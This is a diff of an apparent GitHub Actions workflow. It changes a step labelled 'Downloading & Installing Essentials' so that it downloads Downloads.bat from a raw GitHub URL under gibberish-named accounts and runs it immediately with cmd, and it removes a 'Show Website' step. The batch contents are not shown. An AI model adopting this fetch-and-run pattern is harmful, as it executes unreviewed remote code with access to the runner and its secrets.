@@ -12,11 +12,8 @@ jobs:
     steps:
       - name: Downloading & Installing Essentials
         run: |
-          Invoke-WebRequest -Uri "https://gitlab.com/epubgpvp-group/epubgpvp-project/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Ufzjhhshdhddfhhhdgeg/Vgg-fwgwffw/refs/heads/main/Downloads.bat" -OutFile "Downloads.bat"
           cmd /c Downloads.bat
-
-      - name: Show Website
-        run: cmd /c show.bat
 
       - name: Time Counter
         run: cmd /c loop.bat
